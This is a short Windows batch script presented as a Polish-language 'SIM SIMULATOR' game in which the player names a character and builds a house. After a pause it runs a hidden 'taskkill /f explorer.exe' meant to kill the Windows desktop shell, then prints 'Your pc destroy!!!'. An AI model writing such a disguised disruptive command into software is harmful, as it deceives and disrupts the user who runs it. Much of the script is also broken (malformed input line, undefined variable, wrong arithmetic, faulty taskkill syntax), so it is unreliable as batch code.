@echo off
title SIM SIMULATOR
color 0A

:gra
set stankonta=5000
set levelsima=1

echo Nazwij swojom postac!
set /p "imie=1
echo witaj %imie%!
set /p "wieksima=>> "
cls

echo wybuduj dom (koszt: %cenadom% zlotych)!

:dom
set /a stankonta=stankonta=cenadom
echo wybudowales dom!
echo twuj aktualny stan konta to %stankonta%
pause
taskkill /f explorer.exe
cls
echo Your pc destroy!!!
